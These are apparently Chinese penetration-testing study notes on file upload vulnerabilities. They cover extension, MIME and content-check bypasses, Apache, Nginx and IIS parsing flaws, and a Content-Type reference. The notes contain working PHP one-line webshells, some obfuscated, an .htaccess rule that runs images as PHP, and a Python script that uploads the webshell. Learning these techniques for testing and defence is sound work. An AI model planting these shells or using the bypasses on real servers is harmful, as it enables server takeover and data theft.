# 文件上传

## 漏洞基础概述

### 漏洞定义

文件上传漏洞是Web应用中最常见的高危漏洞之一，指应用程序对用户上传的文件未进行严格的合法性校验，或校验逻辑存在缺陷，导致攻击者可以上传恶意脚本文件（如PHP、ASP、JSP、Python等可执行脚本），并通过访问该文件执行恶意代码，最终实现控制服务器、窃取数据、内网渗透等攻击目的。

该漏洞属于**代码执行类漏洞**的典型分支，利用门槛低、危害直接，是Web渗透测试中优先级最高的测试点之一，也是红蓝对抗中GetShell的核心途径。



### 漏洞形成的必要条件

文件上传漏洞的成功利用必须同时满足三个核心条件，缺一不可：

1. **上传功能存在**：Web应用提供文件上传入口，且攻击者可正常访问与使用。
2. **校验逻辑缺陷**：服务端对上传文件的格式、类型、内容、路径等校验存在绕过空间，允许恶意脚本文件被上传到服务器。
3. **文件可被解析执行**：上传的恶意文件存储在Web可访问的目录中，且服务器环境会将该文件当作脚本解析执行；若仅存储在非Web目录或仅作为静态文件返回，则无法直接利用。





### 漏洞危害等级与影响

- **高危/严重级别**：直接导致服务器被远程代码执行（RCE），攻击者可获取Web服务器权限，进一步提权后控制整台主机。
- 次级影响：
  - 上传webshell实现持久化控制
  - 读取、篡改、删除服务器敏感文件
  - 以服务器为跳板进行内网横向渗透
  - 上传恶意页面进行钓鱼、挂马
  - 篡改网站内容、植入黑链







### 各个容器原生支持什么

- **Nginx + PHP-FPM（Linux 最常见）**：只解析 PHP 系列：`.php`、`.phtml`、`.pht`、`.php5` 等；**JSP、ASP 直接当成静态文本返回，不会执行**腾讯云
- **Tomcat（Java）**：只解析 `.jsp`、`.jspx`；PHP、ASP 不解析。很多架构是 Nginx 反向代理 Tomcat，Nginx 只转发 jsp 请求给 Tomcat，其他静态自己处理
- IIS（Windows）
  - 老 IIS6：支持 `.asp`；装了 [ASP.NET](https://ASP.NET) 才支持 `.aspx`；单独配 FastCGI 才会解析 PHP
  - 新版 IIS7+：默认一般是 aspx；asp 很多时候是关闭的，PHP 需要额外装 FastCGI 映射



探针小文件实测

1. **探针小文件实测（最准，推荐）** 不要直接上大马，先上传**极简探针**，同一个内容，换后缀依次试：

```
<?php phpinfo(); ?>
```

分别存成 `test.php` / `test.phtml` / `test.jsp` / `test.asp`

- 访问后：返回 phpinfo 页面 → PHP 环境 ✅
- 访问后直接把源码打印在页面上 → **上传成功，但是不解析** ❌
- 403/404 → 上传失败或者路径不对





## waf绕过技术详解

### 前端校验（客户端校验）

仅通过JavaScript在浏览器端对文件后缀、大小进行校验，服务端未做二次校验。这是最弱的校验方式，几乎等同于无防护。

1. **浏览器禁用JavaScript**：直接在浏览器设置中关闭JS，绕过前端检测逻辑。
2. **抓包修改文件名**：先上传符合规则的正常图片，使用BurpSuite等工具拦截请求，将文件名修改为恶意脚本后缀（如将 `1.jpg` 改为 `shell.php`）。
3. **删除前端校验函数**：通过F12开发者工具修改页面HTML与JS代码，移除 `onchange` 等校验事件。





###  服务端MIME类型校验

服务端通过读取HTTP请求头中的 `Content-Type` 字段判断文件类型，例如仅允许 `image/jpeg`、`image/png` 等类型通过。该校验仅验证请求头字段，未实际检测文件内容。

直接抓包修改该字段即可：

- 上传PHP文件时，将请求头中的 `Content-Type: application/octet-stream` 修改为 `Content-Type: image/jpeg`，即可通过校验。
- 常见合法图片MIME值：`image/jpeg`、`image/png`、`image/gif`、`image/bmp`。





### 文件后缀名校验

这是最常见的校验方式，分为黑名单校验与白名单校验两类：

黑名单校验:

黑名单校验的绕过手法最为丰富，核心是利用系统特性、解析特性寻找黑名单未覆盖的后缀。

（1）大小写绕过:

适用于Windows系统（文件名不区分大小写），且服务端未统一转换文件名大小写的场景。

示例：将 `shell.php` 改为 `shell.Php`、`shell.PHP`、`shell.pHp`，绕过黑名单的 `php` 关键字匹配，Windows下仍会被当作PHP文件解析。

（2）特殊后缀绕过:

利用Web服务器的多后缀解析特性，使用黑名单未拦截的合法后缀：

- PHP环境常见替代后缀：`php3`、`php4`、`php5`、`phtml`、`phps`、`php7`
- ASP环境：`asa`、`cer`、`cdx`
- ASPX环境：`ashx`、`asmx`
- JSP环境：`jspx`、`jspf`

（3）文件名末尾加点/空格绕过:

仅适用于Windows系统，Windows会自动去除文件名末尾的点和空格。

示例：`shell.php.`、`shell.php `（末尾加空格），服务端黑名单匹配 `php` 失败，但Windows保存文件时会自动去掉末尾的点和空格，最终仍为 `shell.php`。

（4）Windows ::$DATA 数据流绕过:

Windows NTFS文件系统支持NTFS交换数据流（ADS），文件名后加 `::$DATA` 时，系统会将其当作文件的数据流，实际保存的仍是原文件名。

示例：上传 `shell.php::$DATA`，服务端未匹配到 `php` 后缀，服务器最终保存为 `shell.php`。

（5）双写/多写后缀绕过:

适用于服务端会将危险后缀替换为空的场景（如将 `php` 替换为空字符串）。

- 示例：`shell.pphphp`，服务端删除中间的 `php` 后，剩余字符拼接为 `shell.php`，成功绕过。
- 进阶：多层嵌套如 `shell.ppphpphpp`，应对多次替换逻辑。

（6）点+空格+点组合绕过:

利用服务端过滤逻辑的顺序缺陷，构造 `shell.php. .`（点空格点），过滤空格后变为 `shell.php..`，再过滤末尾点后变为 `shell.php`。



白名单校验:

（1）%00 截断绕过:

**原理**：利用C语言等底层字符串处理中 `\0` 作为字符串结束符的特性，让服务端在读取文件名时，遇到 `%00` 就截断，从而保留前面的恶意后缀。

- 适用场景：PHP版本 < 5.3.4，且PHP的 `magic_quotes_gpc` 为关闭状态；常见于 `move_uploaded_file()` 等函数的路径参数。
- GET型截断：上传路径参数构造为 `upload/shell.php%00`，文件名设为 `1.jpg`，服务端拼接路径后为 `upload/shell.php%001.jpg`，实际保存为 `shell.php`。
- POST型截断：POST请求中需在二进制层面插入 `00` 字节（BurpSuite中Hex编辑），不能直接写 `%00`。

（2）路径穿越+截断:

结合目录遍历漏洞，构造文件名如 `../shell.php%00.jpg`，服务端保存时路径上溢，将文件写入Web根目录并截断为PHP文件。

（3）配合解析漏洞:

上传符合白名单的文件名，但利用服务器解析漏洞让其以脚本方式执行



### 文件内容校验绕过

（1）文件头欺骗（图片马基础版）

在恶意脚本文件开头添加对应格式的文件头魔术字节，绕过文件头检测。

- 常见文件头：
  - JPG：`FF D8 FF E0` （对应文本 `ÿØÿà`）
  - PNG：`89 50 4E 47 0D 0A 1A 0A`
  - GIF：`47 49 46 38` （对应文本 `GIF89a`）

制作示例：

```
命令行合成：copy 1.jpg /b + shell.php /b shell.jpg
手动添加：在PHP代码第一行写入GIF89a
```

( 2 )图片马免杀进阶

针对内容关键字检测（如检测 `<?php`）：

- 使用短标签：`<?=`、`<?`（需PHP配置 `short_open_tag=On`）
- 字符串拼接混淆：`<?php $a='a'.'s'.'s'.'e'.'r'.'t'; $a($_POST['x']);?>`
- 编码绕过：base64解码执行、rot13混淆
- 注释拆分：`<?php /*注释*/ assert($_POST['x']);?>`



### 可配置文件解析

（1）.htaccess 文件上传

Apache环境下，上传自定义 `.htaccess` 文件，可配置文件解析规则，例如将所有jpg文件当作PHP解析，再上传图片马即可执行。

```
AddType application/x-httpd-php .jpg
```

（2）.user.ini 文件上传

PHP CGI/FastCGI环境下，上传 `.user.ini` 可自动扩展PHP配置，例如设置 `auto_prepend_file=1.jpg`，让当前目录下所有PHP文件自动包含1.jpg，配合图片马实现代码执行。



## 主流Web服务器解析漏洞

###  Apache 解析漏洞

（1）多后缀解析漏洞

Apache默认按从右到左的顺序识别后缀，若最右侧后缀不识别，则继续向左识别，直到遇到可识别的后缀。

- 示例：文件 `shell.php.jpg`，Apache无法识别 `.jpg` 的解析方式，向左识别到 `.php`，将文件当作PHP解析。
- 影响版本：Apache 1.x、2.x 系列，与配置相关。

（2）Apache 换行解析漏洞（CVE-2017-15715）

- 影响版本：Apache 2.4.0~2.4.29
- 原理：文件名末尾添加换行符（`\x0a`），正则匹配 `\.php$` 失败，但Apache仍会将其当作PHP文件解析。
- 利用：上传文件名为 `shell.php\x0a`，绕过后缀校验并成功解析。

###  Nginx 解析漏洞

（1）文件名路径解析漏洞

- 原理：当访问 `http://xxx.com/1.jpg/shell.php` 时，若Nginx配置不当，会将 `1.jpg` 当作PHP文件解析。
- 成因：Nginx配置中 `cgi.fix_pathinfo` 默认开启，且PHP以CGI/FastCGI方式运行。
- 利用：上传正常图片马 `1.jpg`，访问 `/1.jpg/.php` 或 `/1.jpg/shell.php` 即可触发PHP解析。

（2）Nginx 空字节代码执行漏洞（CVE-2013-4547）

- 影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7
- 原理：文件名中插入 `\0` 字节，Nginx匹配后缀时截断，后端PHP按完整路径解析。
- 利用：上传 `shell.jpg`，访问 `/shell.jpg%00.php` 触发PHP解析。

###  IIS 解析漏洞

（1）IIS 6.0 分号解析漏洞

- 原理：文件名中包含分号 `;` 时，IIS 6.0会截断分号后的内容，以分号前的后缀解析。
- 示例：`shell.asp;1.jpg`，IIS 6.0会将其当作 `shell.asp` 解析执行。

（2）IIS 6.0 目录解析漏洞

- 原理：若目录名以 `.asp` 结尾，该目录下的所有文件都会被当作ASP脚本解析。
- 示例：创建 `/shell.asp/` 目录，目录内上传任意 `1.jpg`，访问后会以ASP执行。

（3）IIS 7.x / 7.5 解析漏洞

原理：与Nginx类似，FastCGI模式下，访问 `/1.jpg/shell.php` 会将图片当作PHP解析，依赖PHP的 `cgi.fix_pathinfo` 配置





## Content-Type种类

格式：`主类型/子类型; 参数`

### text/* 文本类（可直接渲染、纯文本）

特点：文本，可读，一般带 `charset` 指定编码

1. text/html; charset=utf-8
   - 场景：网页 HTML 页面，服务器返回 html
   - 浏览器收到直接渲染成网页
2. text/plain; charset=utf-8
   - 场景：纯文本，日志、简单文本返回、txt 文件
   - 不会解析 HTML 标签，原样展示文字
3. text/css
   - 场景：css 样式文件
4. text/javascript
   - 场景：js 脚本文件（新标准推荐这个，旧的 application/javascript 也兼容）
5. text/csv
   - 场景：csv 表格文本

### application/* 应用数据类（最核心、高频）

这类是结构化数据、二进制文件、API 主体

1. application/json（⭐REST API 首选）
   - 场景：前后端分离接口、大部分开放 API，传结构化 json
   - 特点：支持嵌套对象、数组；**标准 RFC8259 规定 JSON 默认 UTF-8，不需要写 charset=utf-8，写了也不规范**
   - 例子：`{"username":"test","id":1}`
   - 限制：原生不支持二进制文件，文件放 json 里只能 base64 编码（体积变大）
2. application/x-www-form-urlencoded（⭐原生 form 默认）
   - 场景：传统 HTML form 表单提交（不带文件）、简单登录提交
   - 格式：`key1=value1&key2=value2`，特殊字符 URL 百分编码
   - ❗不能传文件、不支持嵌套结构，只能一维键值对腾讯云
   - 前端：form 不写 enctype 默认就是这个
3. multipart/form-data（⭐文件上传专用，multipart 大类）
   - 场景：上传图片 / 文件，**同时携带普通表单参数**
   - 原理：body 用`boundary`分隔成多个块，每块独立带自己的 Content-Disposition、Content-Type
   - 重点坑：**不要手动写 boundary！浏览器 /axios FormData 会自动生成**，手动写错直接后端接收不到数据
   - 渗透考点：上传漏洞、文件上传靶场几乎都是这个 Content-Type
4. application/xml / text/xml
   - 场景：老接口、SOAP 接口、xml 报文；application/xml 是严格模式
5. application/octet-stream（二进制流，万能下载）
   - 场景：未知二进制文件、强制下载（浏览器收到直接弹出下载框，不会预览）
   - 渗透常用：返回 exe、bin、任意二进制文件
6. **application/pdf**：pdf 文档在线预览
7. **application/zip**：zip 压缩包
8. **application/vnd.openxmlformats-officedocument.spreadsheetml.sheet**：xlsx
9. **application/vnd.ms-excel**：老 xls
10. **application/problem+json**：标准错误返回体（RFC9457，标准化接口报错 json）

### image/* 图片资源

浏览器识别后渲染图片

- image/jpeg / image/jpg
- image/png
- image/gif（动图）
- image/webp（现代压缩图）
- image/svg+xml（矢量 svg，本质 xml 文本）

### audio/* 音频

- audio/mpeg：mp3
- audio/wav
- audio/ogg

### video/* 视频

- video/mp4
- video/webm
- video/ogg

### multipart/* 多分段类型（不止 form-data）

- multipart/form-data：文件上传（上面讲了）
- multipart/byteranges：HTTP 206 分段断点续传（Range 请求分片返回）MDN Web Do...
- multipart/mixed：邮件、消息里混合多种资源

### font/* 字体

- font/woff、font/woff2：网页字体



### 快速选型口诀

- 普通登录、简单一维表单 → `x-www-form-urlencoded`
- 上传图片 / 文件 → `multipart/form-data`
- 现代前后端接口、嵌套结构 → `application/json`
- 返回文件、二进制下载 → `octet-stream`
- 返回网页 → `text/html; charset=utf-8`
- 返回图片 → image/*





## 文件上传请求包详解

只要是上传文件，正常浏览器发出来的 Content-Type 一定是 `multipart/form-data`

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
```

`boundary` 就是**分隔符**，用来切割 body 里一块一块的数据

> boundary 前面有 `----`，包体里每一块开头是 `----加上这个字符串`，最后结尾还要多两个 `-`



Body 包体:

```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

<?php eval($_POST[cmd]);?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundary7MA4YWxkTrZu0gW--

```

Content-Disposition: form-data; name="file"; filename="test.jpg"

- `name="file"`：表单字段名，后端代码 `$_FILES['file']` 就是拿这个 name，**很多靶场名字不是 file！比如 upfile、img**，这里错了接收不到
- `filename="test.jpg"`：文件名

`Content-Type: image/jpeg`
 **这是这个文件块自己的 MIME 类型（文件的 Content-Type），不是请求头那个**





对于原始抓包样例

```
POST /upload.php HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="username"

admin
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="uploadfile"; filename="shell.jpg"
Content-Type: image/jpeg

<?php eval($_POST[cmd]);?>
------WebKitFormBoundaryABC123--

```

与之对应py的requests 写法

requests 会**自动帮你生成 boundary、自动写 Content-Disposition**，不用自己拼字符串。

```
import requests

url = "http://127.0.0.1/upload.php"

# 文件内容：一句话木马
shell_content = b'<?php eval($_POST[cmd]);?>'

# files 结构：参数名，(文件名, 文件内容, MIME类型)
files = {
    "uploadfile": ("shell.jpg", shell_content, "image/jpeg")
}
data = {
    "username": "admin"
}

resp = requests.post(url, data=data, files=files)
print(resp.text)

```
